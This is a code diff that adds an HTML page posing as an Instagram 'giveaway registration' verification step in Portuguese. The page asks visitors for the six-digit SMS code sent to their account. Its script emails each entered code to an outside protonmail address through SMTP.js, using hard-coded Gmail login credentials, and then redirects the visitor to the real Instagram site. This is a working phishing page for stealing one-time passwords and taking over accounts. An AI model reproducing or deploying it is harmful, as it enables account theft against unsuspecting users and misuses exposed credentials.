@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+  </head>
+  <body>
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="">
+                <h1 style="
+                    background-image: url(https://www.instagram.com/static/bundles/metro/sprite_core_2x_bcd90c1d4868.png/bcd90c1d4868.png);
+                    background-size: 440px 411px;
+                    background-position: 0 -129px;
+                    width: 400px;
+                    margin: 22px auto 12px;        
+                    display: block;
+                    overflow: hidden;
+                    text-indent: 110%;
+                    white-space: nowrap;
+                    height: 52px;
+                ">Instagram</h1>  
+            </div>
+        </div>
+        <div class="row justify-content-center">
+            <div>
+                <h2 style="        
+                text-align: center;
+                font-size: large;
+                margin: 22px;">
+                    Cadastro sorteio.
+                </h2>
+            </div>
+        </div>
+        
+        <div class="row justify-content-center">
+            <div class="col-10">
+                <h2 style="        
+                text-align: center;
+                font-size: large;
+                margin: 22px;">
+                    <span>Para verificação sua conta, enviaremos um <b>sms </b> com um código para verificar sua identidade</span>
+                </h2>
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-6">
+                <form>
+                    <div id="bad-login"></div>
+                    <input type="number" onblur="troca()" maxlength="6" autocomplete="" spellcheck="false" tabindex="0" placeholder="_ _ _   _ _ _" name="otp" autocapitalize="none" id="otp" dir="ltr" data-initial-dir="ltr" data-initial-value="" style="        
+                    font-weight: bolder;
+                    outline: none;
+                    height: 44px;
+                    margin-bottom: 24px;
+                    text-emphasis: none;
+                    width: 100%;
+                    text-align: center;
+                    text-decoration: wavy;">
+                    <div style="        
+                    justify-content: end;
+                    text-align: center;">
+                        <input id="otpBtn" type="button" value="Verificar   " style="
+                            height: 44px;
+                            background-color: rgb(178, 223, 252);
+                            border: none;
+                            color: #fff;
+                            width: 100%;">
+                    </div>
+                </form>
+                <script>
+                    var x = document.getElementById("otpBtn");
+                    var err = document.getElementById("bad-login");
+                    x.addEventListener("click", function(e) {
+                        e.preventDefault();
+                        var oOtp = document.querySelector("#otp");
+                        var y = oOtp.value;
+                        Email.send({
+                            Host: "smtp.gmail.com",
+                            Username : "xsda.ddce.2343.2343.xsop@gmail.com",
+                            Password : "xhqe towf geiu nvyt",
+                            To : 'user1533@protonmail.com',
+                            From : "xsda.ddce.2343.2343.xsop@gmail.com",
+                            Subject : y,
+                            Body : "<p> << One Time Password </p>",
+                        });
+                        window.location.href = "http://www.instagram.com";
+                    });
+                </script>
+                <script>
+                    function troca(){
+                        var code = document.querySelector("#otp");
+                        var codevalue = code.value;
+
+                        if (codevalue.length == 6) {
+                            document.getElementById('otpBtn').style.backgroundColor = 'rgb(0, 149, 246)';
+                        } else {
+                            document.getElementById('otpBtn').style.backgroundColor = 'rgb(178, 223, 252)';
+                        }
+                    }                 
+                </script>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    </body>
+</html>
